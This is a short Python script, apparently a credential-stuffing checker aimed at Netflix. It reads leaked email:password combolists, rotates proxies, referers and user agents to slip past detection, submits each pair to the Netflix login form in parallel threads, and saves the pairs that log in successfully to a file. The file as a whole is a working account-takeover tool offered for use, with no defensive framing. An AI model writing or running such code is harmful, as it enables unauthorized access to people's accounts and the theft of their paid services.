import mechanicalsoup
import time
import random
import _thread


def netflix(email, parola):
    p = random.choice(q)[:-1]
    print(p)
    referer = random.choice(r)[:-1]
    user = random.choice(u)[:-1]
    proxies = {'http': 'http://' + p}
    browser = mechanicalsoup.StatefulBrowser()
    browser.session.proxies = proxies
    browser.session.headers = {'referer': referer, 'User-Agent': user}
    browser.open("https://netflix.com/login")
    browser.select_form('form[class="login-form"]')
    browser["userLoginId"] = email
    browser["password"] = parola
    browser.submit_selected()
    print(browser.get_url())
    if not "login" in browser.get_url():
        print(email, parola)
        n.write(email + ":" + parola)
        n.write(":" + p + "\n")
        browser.close()
    else:
        browser.close()


r = open("C:\\refe.txt", "r", encoding="iso-8859-9")
r = list(r)
u = open("C:\\user.txt", "r", encoding="iso-8859-9")
u = list(u)
q = open(proxy, "r", encoding="iso-8859-9")
q = list(q)
e = open(combolist, "r", encoding="iso-8859-9")
while True:
    with open("C:\\netflix.txt", "a", encoding="iso-8859-9") as n:
        a = e.readline()
        if len(a) == 0:
            n.close()
            break
        b = a.split(":")
        email = b[0]
        if len(b[1]) < 2:
            continue
        parola = b[1][:-1]
        print(e.tell())
        _thread.start_new_thread(netflix, (email, parola))
        time.sleep(0.2)
e.close()
